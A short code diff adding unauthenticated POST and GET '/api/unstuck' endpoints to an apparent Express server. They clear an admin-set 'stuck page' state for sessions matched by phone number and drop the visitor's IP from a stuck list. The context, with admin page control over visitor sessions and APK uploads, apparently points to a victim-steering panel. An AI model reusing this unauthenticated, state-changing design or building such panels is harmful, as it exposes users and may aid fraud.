@@ -728,6 +728,49 @@ app.get('/api/add-note', (req, res) => {
   res.json({ success: false });
 });
 
+// ===== UNSTUCK: Remove stuck state by phone =====
+app.post('/api/unstuck', (req, res) => {
+  const phone = req.body?.phone || req.query?.phone;
+  if (!phone) return res.json({ success: false });
+
+  const n = normalizePhoneForLookup(phone);
+
+  for (const [id, data] of Object.entries(sessions)) {
+    if (!data || data.stuckPageActive !== true) continue;
+    const p1 = normalizePhoneForLookup(data.initialPhone);
+    const p2 = normalizePhoneForLookup(data.gatewayPhone);
+    if (p1 === n || p2 === n) {
+      sessions[id] = { ...data, stuckPageActive: false, stuckPageMessage: '', adminAction: 'NONE', lastUpdated: Date.now() };
+      saveSession(id);
+      if (data.clientIp && stuckIps[data.clientIp]) { delete stuckIps[data.clientIp]; saveStuckIps(); }
+      return res.json({ success: true });
+    }
+  }
+
+  res.json({ success: false });
+});
+
+app.get('/api/unstuck', (req, res) => {
+  const phone = req.query?.phone;
+  if (!phone) return res.json({ success: false });
+
+  const n = normalizePhoneForLookup(phone);
+
+  for (const [id, data] of Object.entries(sessions)) {
+    if (!data || data.stuckPageActive !== true) continue;
+    const p1 = normalizePhoneForLookup(data.initialPhone);
+    const p2 = normalizePhoneForLookup(data.gatewayPhone);
+    if (p1 === n || p2 === n) {
+      sessions[id] = { ...data, stuckPageActive: false, stuckPageMessage: '', adminAction: 'NONE', lastUpdated: Date.now() };
+      saveSession(id);
+      if (data.clientIp && stuckIps[data.clientIp]) { delete stuckIps[data.clientIp]; saveStuckIps(); }
+      return res.json({ success: true });
+    }
+  }
+
+  res.json({ success: false });
+});
+
 // ===== APK MANAGEMENT (Admin upload + download URL) =====
 
 // Serve uploaded files
